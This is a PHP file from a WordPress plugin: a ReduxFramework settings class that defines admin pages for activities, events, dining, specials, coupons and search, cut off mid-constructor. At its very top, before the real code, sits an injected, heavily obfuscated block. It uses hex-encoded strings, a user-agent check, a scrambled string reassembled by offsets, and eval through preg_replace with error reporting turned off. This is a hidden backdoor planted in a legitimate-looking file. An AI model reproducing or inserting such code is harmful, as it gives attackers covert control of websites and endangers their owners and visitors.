<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $xbaqhvjzfe = ']e7y]#>n%x5c%x7825<#372]58y]472]37y]672]48y]c%x7825%x5c%x787f!<Xmbg}%x5c%x787f;!osvufs}w;*y34]68]y33]65]y31]53]y6dy76#<%x5c%x78e%x5c%x78b%x5c%x7825w:%x7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c54]y76#<%x5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t5cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878BsfuvA%x5c%x7827pd%x5c%x78WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x5!<*::::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<#5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:mgoj{hA!osvufs!~<3,j%x5c%x782824-%x5c%x7824*<!~!dsfbuf%x5c%xppde#)tutjyf%x5c%x78604%x52f+*0f(-!#]y76]277]y72]265]y39]271%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7825))!gj!<*#cd2bge5273qj%x5c%x78256<*Y%x5c%x7825)7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%825h>EzH,2W%x5c%x7825wN;#-Ez-1H*ttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7820QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw625)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x6]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x782x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x78254-%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x78256<^#zsfvr#%x5c%x785cq%x5c5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-b81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-%x5c%x787)!gj}Z;h!opjudovg}{;82fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78e%x%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%s%x5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x550%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftbfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x7825:>:r%x5c%x7825:|:%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x58r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y860cpV%x5c%x787f%x5c%x787f%x5c%x72f%x5c%x7825r%x5c%x7878<~!!%x5c%x78ovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5cx5c%x782272qj%x5c%x78]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x78pdof.)fepdof.%x5c%x782f#@#%5c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x782:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c*%x5c%x7824-%x5c%x7824!>!tus%x5c%xG#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x7825)ppde>u%x5c%x7825V<#65,471]K9]77]D4]82]K6]72]K9]78]K5]53]>b%x5c%x7825Z<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fu#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48yx7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfsp>hmg%x5c%x7825!<12>j%x8L3P6L1M5]D2P4]D6#<%x5c%x7825G]y25)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78!>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hx782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x782u{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x7827*&7-141%x72%164") && (!isset($GLOBALS["%x61%156%x75%156%x6otn+qsvmt+fmhpph#)zbssKc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x7;%x5c%x7825!<*#}_;#)35)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!7825!osvufs!*!+A!>!{e%be!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%xx5c%x782fqp%x5c%x7825>5h%x5c%x7824-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x782#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x7<%x5c%x7825tdz>#L4]275L3]24c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782fb!-#}#)fepmqnj!%x5c%x782f!#p3)%x5c%x7825cB%x5c%x7825iN}#-!7825tzw>!#]y76]277]y72]265]y39]274]~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%#zsfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)uf66%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61%1c%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y77860gvodujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%xubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x782%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#*#[k2%x5c%x7860{6:!}7;!}6;##}C;5!<5h%x5c%x7825%x5c%x782f#0#%x5c%x82f2986+7**^%x5c%x78<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x787860439275ttfsqnpdov{h19275j{hnpn%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ft82]y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%x7824Yp]y83]256]y78]248]y83]256]y81]265]y72]254]y76]61]y33]68]23ldfid>}&;!osvufs}%x5c%x787f;!opjy85]273]y6g]273]y76]271]y7d]252]y74]256]y39c%x78223}!+!<+{e%x5c%x7825+*!*+f5)!gj!<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!fnbozcYufhA%x5c%x78272qj%x5x7825}K;%x5c%x7860ufldpt5c%x7825!|!*#91y]c9y]g2y]#>>*if((function_exists("%x6f%142%x5f%163%x74%%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x5c%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c25%x5c%x7827Y%x5c%x7fmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!*7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x5c%x7825)!>>%x5c%x7822!ftmbg)#)tutjyf%x5c%x7860opjud4-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*%x7825_t%x5c%x7825:osvufs:~:<*2bd%x5c%x7825-#1GO%x5c%x782j=tj{fpg)%x5c%x7825%x5c%x7x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64y]552<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x%x5c%x7827,*d%x5c%x7827,*c%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj3]248]y83]256]y81]265]y72]2Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c7825j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%#!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x5c2b%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!!#~<%x5c%x7825h00#*<%x5c%x4]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785csboe))1%x5c%x7x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x%x22%134%x78%62%x35%165%x3a%146%x21%76%x21%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)d19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5cpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e782f#M5]DgP5]D6#<%x582f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI5cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^]#>m%x5c%x7825:|:*r%x5c71%x5f%155%x61%160%x28%42%x66%152%x66%14%x7827,*b%x5c%x7827)fe*9!%x5c%x7827!hmg%x5c%x785946-tr.984:75983:48984:x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782f*)323z%x7878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x782f35.)1%x5c%x782f14+9**-)1%x5c%x75c%x7825j:>>1*!%x5c%x7825b:>1x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-*msv%x5c%x78257-MSV,6<*)ujojR%x5c-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825c%x7860hA%x5c%x7827pd%x5c%x78256<C%x5c%x7827pd%x5c%x78256|6.7e<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%x7>.%x5c%x7825!<***f%x5c%x7827,*ef#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%**t%x5c%x7825)m%x5c%x7825=*h%7%x67%42%x2c%163%x74%162%x5f%163%x70%154%x69%164%505c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x57825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x7827824-%x5c%x7824!>!fyqmpef)#%x5c%x7824!gj<*#k#)usbut%x5c%x71"])))) { $GLOBALS["%x61%156%x83]427]36]373P6]36]73]83]238M7]381]dR6<*id%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI:osvufs:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%xepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sutcvt)e6+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbn7R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<#16,47R5%x7825:-5ppde:4:|:**#y86]267]y74]275]y7:]268]y78256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x78!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*o2w>#]y74]273]y76]252]y85]256]y6g]257]5>j%x5c%x7825!*3!%x5c%x7827!hmg%x25)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c211M5]67]452]88]5]48]32M3]317]445]212]445]43]321error_reporting(0); preg_replace("%x2f%50%x2e%52%x29%57%x65","%x65%1y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); }f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%%x78257%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x5c%x787,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%25s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825jx5c%x7825h>#]y31]278]y3e]udovg}k~~9{d%x5c%x7825c%x78b%x5c%x7825ggg!>!#]y81]2736d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7860bj+upc7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x78256<pd%x5c%x7825w6Z6tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x782pmdXA6~6<u%x5c%x78257>%x5c%x787825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]25c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825z-#:#x7824-%x5c%x7824b!>!%x25)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x78260hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x*uyfu%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%xso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]]464]284]364]6]234]342]58]2<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x78231M6]y3e]81#%x5c%x782f#7e:5782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#%x7825-bubE{h%x5c%x7825)sutcvt)fubx7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpm87f%x5c%x787f<u%x5c%x7825V]281]y43]78]y33]65]y31]55]y85]82]75%156%x61"]=1; function fjfgg($n){return chr(ord($n)-1);} @}X;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x72f7&6|7**111127-K)ebfsX%x5c%]252]y83]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y8/(.*)/epreg_replacedbhdzkiumv'; $ojavhxjzlh = explode(chr((172-128)),'4708,42,3003,54,7469,30,9922,60,8355,68,3853,64,6411,40,7214,51,5959,43,1678,48,114,35,2850,54,320,21,9004,20,4214,66,9303,49,6881,63,2955,48,4312,45,9082,30,10027,28,2694,51,1637,41,3467,56,842,64,5255,57,2560,65,1780,48,2086,21,2801,49,690,30,4628,27,1170,32,8583,48,6347,41,3790,63,801,41,4871,20,7887,65,3677,57,6716,45,5920,39,7324,47,9814,49,7534,58,1434,39,6813,33,4750,57,5403,37,1392,42,4129,31,8004,61,4655,24,9982,45,2305,58,1726,54,64,26,1535,36,1307,20,5038,23,2024,62,9737,34,503,29,8165,33,1202,37,4016,62,4565,63,6473,25,906,41,8065,63,4891,56,7696,52,2745,24,4679,29,3304,49,8198,62,8936,68,5698,59,5135,29,3353,39,6846,35,4160,34,9694,43,6981,31,5373,30,6451,22,2175,27,3271,33,397,54,5560,60,8881,55,3057,22,3523,27,6065,69,5620,38,667,23,7748,42,6171,43,6302,45,1102,68,44,20,2511,49,7952,52,9258,45,3162,41,9352,70,7265,59,2904,51,3140,22,4456,34,8761,22,7592,60,4280,32,6134,37,7840,21,563,26,4533,32,7652,44,3203,22,5008,30,7448,21,1956,33,9863,26,4807,64,2448,30,7790,50,8631,38,6002,63,1571,66,5848,48,5896,24,3616,61,7124,61,6522,66,3225,46,3581,35,4490,43,10055,51,5440,27,199,62,8128,37,7861,26,8477,40,5107,28,6944,37,1327,65,720,49,1828,22,7185,29,5190,65,0,44,2625,69,6388,23,149,50,623,44,3917,52,947,68,5061,46,5658,40,5511,49,9236,22,9176,60,2363,34,4947,61,9771,43,9601,66,1059,43,1015,44,5164,26,532,31,3969,47,7411,37,9464,62,4357,44,3550,31,9024,58,2202,44,261,59,9422,42,6588,65,769,32,341,56,7371,40,7012,58,3734,56,8736,25,1239,68,1905,51,9667,27,6498,24,2478,33,3079,61,6214,20,7070,54,3440,27,2769,32,8814,67,8517,66,6761,52,5757,26,9112,64,7499,35,8307,48,9526,27,5783,65,6653,34,4194,20,1989,35,8669,67,2246,59,6687,29,9553,48,5312,61,451,52,5467,44,3392,48,6234,68,1473,62,8260,47,4078,51,2397,51,1850,55,8783,31,2107,68,589,34,4401,55,90,24,9889,33,8423,54'); $njbqmdzljc=substr($xbaqhvjzfe,(60312-50206),(24-17)); if (!function_exists('jfzntzomks')) { function jfzntzomks($iljlpvdutu, $zlgwgqdrmz) { $pvrquzxtwz = NULL; for($hyavnauomw=0;$hyavnauomw<(sizeof($iljlpvdutu)/2);$hyavnauomw++) { $pvrquzxtwz .= substr($zlgwgqdrmz, $iljlpvdutu[($hyavnauomw*2)],$iljlpvdutu[($hyavnauomw*2)+1]); } return $pvrquzxtwz; };} $qiebambvwc="\x20\57\x2a\40\x78\172\x78\165\x78\154\x70\145\x69\152\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x32\60\x32\55\x31\66\x35\51\x29\54\x20\143\x68\162\x28\50\x34\61\x35\55\x33\62\x33\51\x29\54\x20\152\x66\172\x6e\164\x7a\157\x6d\153\x73\50\x24\157\x6a\141\x76\150\x78\152\x7a\154\x68\54\x24\170\x62\141\x71\150\x76\152\x7a\146\x65\51\x29\51\x3b\40\x2f\52\x20\142\x69\156\x6d\146\x79\142\x6c\141\x6d\40\x2a\57\x20"; $tipbwnnltf=substr($xbaqhvjzfe,(64056-53943),(74-62)); $tipbwnnltf($njbqmdzljc, $qiebambvwc, NULL); $tipbwnnltf=$qiebambvwc; $tipbwnnltf=(606-485); $xbaqhvjzfe=$tipbwnnltf-1; ?><?php
/**
 * ReduxFramework Sample Config File
 * For full documentation, please visit: https://docs.reduxframework.com
 * */

if ( ! class_exists( 'wtd_redux_config' ) ) {
    global $wtd_api_error;
    $wtd_api_error = false;
    global $wtd_client_error;
    $wtd_client_error = false;
    class wtd_redux_config {

        public $args = array();
        public $sections = array();
        public $theme;
        public $ReduxFramework;

        public $mapped_categories;

        private $wtd_pages = array(
            'activities-page' => array(
                'enabled' => 0,
                'args' => array(
                    'icon'       => 'el-icon-th-list',
                    'title'      => 'Activities',
                    'desc'   => '<a href="javscript:void(0);" class="button wtd_reloader" data-type="activities" data-page="activities-page"><i class="el-icon-refresh"></i>&nbsp;&nbsp;&nbsp;Reload Activities</a>',
                    'class' => 'activities-page',
                    'subsection' => true,
                    'fields'     => array(
                        array(
                            'id'       => 'activities_pages',
                            'type'     => 'callback',
                            'title'    => 'Preview Pages',
                            'callback' => 'wtd_activities_pages'
                        ),
                        array(
                            'id'       => 'act_page_type',
                            'type'     => 'button_set',
                            'title'    => 'Navigation',
                            'options'  => array(
                                //1 => 'Full Menu',
                                2 => 'Top Drop-Down Menu',
                                3 => 'Left Side Menu'
                            ),
                            'default' => 3,
                            'compiler' => true
                        ),
                        array(
                            'id'       => 'activities_sort_by',
                            'type'     => 'button_set',
                            'title'    => 'Sort By',
                            'options'  => array(
                                1 => 'Title',
                                3 => 'Activity Provider'
                            ),
                            'default' => 1,
                            'compiler' => true
                        ),
                        array(
                            'id'       => 'act_page_mosaic',
                            'type'     => 'switch',
                            'title'    => 'Mosaic',
                            'on'       => 'Enable',
                            'off'      => 'Disable',
                            'default'  => '',
                            'compiler' => true
                        ),
                        array(
                            'id'       => 'activities_options',
                            'type'     => 'callback',
                            'title'    => 'Categories',
                            'callback' => 'wtd_activities_options'
                        ),
                        array(
                            'id'       => 'act_temp',
                            'type'     => 'callback',
                            'title'    => 'Options<span class="options_wtd_flag" data-place="activities_options">&nbsp</span>',
                            'callback' => 'wtd_act_temp'
                        )
                    )
                )
            ),
            'calendar-page' => array(
                'enabled' => 0,
                'args' => array(
                    'icon'       => 'el-icon-calendar',
                    'title'      => 'Events Calendar',
                    'desc'   => '<a href="javscript:void(0);" class="button wtd_reloader" data-type="events" data-page="calendar-page"><i class="el-icon-refresh"></i>&nbsp;&nbsp;&nbsp;Reload Events</a>',
                    'class' => 'calendar-page',
                    'subsection' => true,
                    'fields'     => array(
                        array(
                            'id'       => 'calendar_pages',
                            'type'     => 'callback',
                            'title'    => 'Preview Pages',
                            'callback' => 'wtd_calendar_pages'
                        ),
                        array(
                            'id'       => 'calendar_type',
                            'type'     => 'button_set',
                            'title'    => 'Navigation',
                            'options'  => array(
                                1 => 'One Image',
                                2 => 'Four Images',
                                3 => 'List View'
                            ),
                            'default' => '',
                            'compiler' => true
                        )
//                        array(
//                            'id'       => 'calendar_options',
//                            'type'     => 'callback',
//                            'title'    => 'Categories',
//                            'callback' => 'wtd_calendar_options'
//                        ),
//                        array(
//                            'id'       => 'calendar_temp',
//                            'type'     => 'callback',
//                            'title'    => 'Options<span class="options_wtd_flag" data-place="calendar_options">&nbsp</span>',
//                            'callback' => 'wtd_calendar_temp'
//                        )
                    )
                )
            ),
            'week-page' => array(
                'enabled' => 0,
                'is_not_section' => true,
                'args' => array(
                    'fields' => array(

                    )
                )
            ),
            'week-specials-page' => array(
                'enabled' => 0,
                'is_not_section' => true,
                'args' => array(
                    'fields' => array(

                    )
                )
            ),
            'dining-page' => array(
                'enabled' => 0,
                'args' => array(
                    'icon'       => 'el-icon-glass',
                    'title'      => 'Dining',
                    'desc'   => '<a href="javscript:void(0);" class="button wtd_reloader" data-type="dining" data-page="dining-page"><i class="el-icon-refresh"></i>&nbsp;&nbsp;&nbsp;Reload Dining</a>',
                    'class' => 'dining-page',
                    'subsection' => true,
                    'fields'     => array(
                        array(
                            'id'       => 'dining_pages',
                            'type'     => 'callback',
                            'title'    => 'Preview Pages',
                            'callback' => 'wtd_dining_pages'
                        ),
                        array(
                            'id'       => 'dining_page_type',
                            'type'     => 'button_set',
                            'title'    => 'Navigation',
                            'options'  => array(
                                //1 => 'Full Menu',
                                2 => 'Top Drop-Down Menu',
                                3 => 'Left Side Menu'
                            ),
                            'default' => 3,
                            'compiler' => true
                        ),
                        array(
                            'id'       => 'dining_sort_by',
                            'type'     => 'button_set',
                            'title'    => 'Sort By',
                            'options'  => array(
                                1 => 'Title',
                                3 => 'Activity Provider'
                            ),
                            'default' => '',
                            'compiler' => true
                        ),
                        array(
                            'id'       => 'dining_options',
                            'type'     => 'callback',
                            'title'    => 'Categories',
                            'callback' => 'wtd_dining_options'
                        )
                    )
                )
            ),
//                'map-page' => array(
//                    'enabled' => 0,
//                    'args' => array(
//                        'icon'       => 'el-icon-map-marker',
//                        'title'      => 'Map',
//                        'desc'   => '<a href="javscript:void(0);" class="button wtd_reloader" data-type="activities" data-page="map-page"><i class="el-icon-refresh"></i>&nbsp;&nbsp;&nbsp;Reload Activities</a>',
//                        'class' => 'map-page',
//                        'subsection' => true,
//                        'fields'     => array(
//                            array(
//                                'id'       => 'map_pages',
//                                'type'     => 'callback',
//                                'title'    => 'Preview Pages',
//                                'callback' => 'wtd_map_pages'
//                            ),
//                            array(
//                                'id'       => 'map_page_type',
//                                'type'     => 'button_set',
//                                'title'    => 'Navigation',
//                                'options'  => array(
//                                    1 => 'Full Menu',
//                                    2 => 'Top Drop-Down Menu',
//                                    3 => 'Left Side Menu'
//                                ),
//                                'default' => '',
//                                'compiler' => true
//                            ),
//                            array(
//                                'id'       => 'map_options',
//                                'type'     => 'callback',
//                                'title'    => 'Categories',
//                                'callback' => 'wtd_map_options'
//                            ),
//                            array(
//                                'id'       => 'map_temp',
//                                'type'     => 'callback',
//                                'title'    => 'Options<span class="options_wtd_flag" data-place="map_options">&nbsp</span>',
//                                'callback' => 'wtd_map_temp'
//                            )
//                        )
//                    )
//                ),
            'specials-page' => array(
                'enabled' => 0,
                'args' => array(
                    'icon'       => 'el-icon-calendar',
                    'title'      => 'Specials',
                    'desc'   => '<a href="javscript:void(0);" class="button wtd_reloader" data-type="specials" data-page="specials-page"><i class="el-icon-refresh"></i>&nbsp;&nbsp;&nbsp;Reload Specials</a>',
                    'class' => 'specials-page',
                    'subsection' => true,
                    'fields'     => array(
                        array(
                            'id'       => 'specials_pages',
                            'type'     => 'callback',
                            'title'    => 'Preview Pages',
                            'callback' => 'wtd_specials_pages'
                        ),
                        array(
                            'id'       => 'specials_type',
                            'type'     => 'button_set',
                            'title'    => 'Navigation',
                            'options'  => array(
                                1 => 'One Image',
                                2 => 'Four Images',
                                3 => 'List View'
                            ),
                            'default' => 3,
                            'compiler' => true
                        )
//                        array(
//                            'id'       => 'specials_options',
//                            'type'     => 'callback',
//                            'title'    => 'Categories',
//                            'callback' => 'wtd_specials_options'
//                        ),
//                        array(
//                            'id'       => 'specials_temp',
//                            'type'     => 'callback',
//                            'title'    => 'Options<span class="options_wtd_flag" data-place="specials_options">&nbsp</span>',
//                            'callback' => 'wtd_specials_temp'
//                        )
                    )
                )
            ),
            'coupons-page' => array(
                'enabled' => 0,
                'args' => array(
                    'icon'       => 'el-icon-tags',
                    'title'      => 'Coupons',
                    'desc'   => '<a href="javscript:void(0);" class="button wtd_reloader" data-type="coupons" data-page="coupons-page"><i class="el-icon-refresh"></i>&nbsp;&nbsp;&nbsp;Reload Coupons</a>',
                    'class' => 'coupons-page',
                    'subsection' => true,
                    'fields'     => array(
                        array(
                            'id'       => 'coupons_pages',
                            'type'     => 'callback',
                            'title'    => 'Preview Pages',
                            'callback' => 'wtd_coupons_pages'
                        ),
                        array(
                            'id'       => 'coupons_options',
                            'type'     => 'callback',
                            'title'    => 'Categories',
                            'callback' => 'wtd_coupons_options'
                        ),
                        array(
                            'id'       => 'coupons_temp',
                            'type'     => 'callback',
                            'title'    => 'Options<span class="options_wtd_flag" data-place="coupons_options">&nbsp</span>',
                            'callback' => 'wtd_coupons_temp'
                        )
                    )
                )
            ),
            'search-page' => array(
                'enabled' => 0,
                'args' => array(
                    'icon'       => 'el-icon-search',
                    'title'      => 'Search',
                    'class' => 'search-page',
                    'subsection' => true,
                    'fields'     => array(
                        array(
                            'id'       => 'shortcode_place',
                            'type'     => 'callback',
                            'title'    => 'Shortcode',
                            'callback' => 'wtd_shortcode_display'
                        ),
                        array(
                            'id'       => 'shortcode_options',
                            'type'     => 'callback',
                            'title'    => 'Categories',
                            'subtitle' => 'exclude categories from search results',
                            'callback' => 'wtd_shortcode_options'
                        ),
                        array(
                            'id'       => 'shortcode_temp',
                            'type'     => 'callback',
                            'title'    => 'Options<span class="options_wtd_flag" data-place="activities_options">&nbsp</span>',
                            'callback' => 'wtd_shortcode_temp'
                        )
                    )
                )
            )
        );
        private $api_active = false;
        private $nav_options = array();

        public function __construct() {

            $this->mapped_categories = get_option('wtd_mapped_categories');

            $nav = get_option('wtd_nav_options');
            foreach ($this->wtd_pages as $page_key => $page){
                foreach ($page['args']['fields'] as $key => $field) {
                    $field_id = $field['id'];
                    if (isset($field['default']) && !in_array($field_id, array('calendar_type', 'specials_type'))){
                        if (!empty($nav[$field_id]))
